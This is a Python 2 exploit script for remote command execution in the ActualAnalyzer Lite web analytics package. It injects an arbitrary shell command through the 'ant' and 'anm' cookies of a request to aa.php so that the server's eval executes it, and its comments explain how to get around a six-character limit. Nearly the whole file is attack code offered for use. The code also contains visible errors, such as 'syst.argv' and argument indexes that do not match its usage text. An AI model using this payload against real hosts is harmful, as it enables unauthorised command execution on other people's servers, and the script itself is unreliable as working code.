###############################
# ActualAnalyzer  exploit.
# Tested on Lite version 
# We load command into a dummy variable as we only have 6 characters to own the eval 
# but load more as first 2 characters get rm'd.
# We then execute the eval with backticks.
# 11/05/2011
##############################

import urllib
import urllib2
import sys
import time



def banner():
	print "	    ____                        __              __                  __                     "
	print "	   / __/_  ______ _ ____ ______/ /___  ______ _/ /___ _____  ____ _/ /_  ______  ___  _____"
	print "	  / /_/ / / / __ `// __ `/ ___/ __/ / / / __ `/ / __ `/ __ \/ __ `/ / / / /_  / / _ \/ ___/"
	print "	 / __/ /_/ / /_/ // /_/ / /__/ /_/ /_/ / /_/ / / /_/ / / / / /_/ / / /_/ / / /_/  __/ /    "
	print "	/_/  \__,_/\__, (_)__,_/\___/\__/\__,_/\__,_/_/\__,_/_/ /_/\__,_/_/\__, / /___/\___/_/     "
	print "	             /_/                                                  /____/                   "


def usage():
	print "	[+] Usage:"
	print "	[-] python " + sys.argv[0] + " -h vulnHOST -d analyticdomain -c \"command\""
	print "	[-] python fuq.actualanalyzer.py -h test.com/lite -d analyticdomain -c \"touch /tmp/123\""

banner()
if len(sys.argv) < 6:
	usage()
	quit()
domain = sys.argv[2]
command = sys.argv[6]
host = syst.argv[4]

def commandexploit(domain,host,command):
	url = 'http://' + domain + '/aa.php?anp=' + host 
	data = None
	headers = {'Cookie': "ant=" + command + "; anm=414.`$cot`"}
	exploit1 = urllib2.Request(url,data,headers)
	exploit2 = urllib2.urlopen(exploit1)

commandexploit(domain,host,command)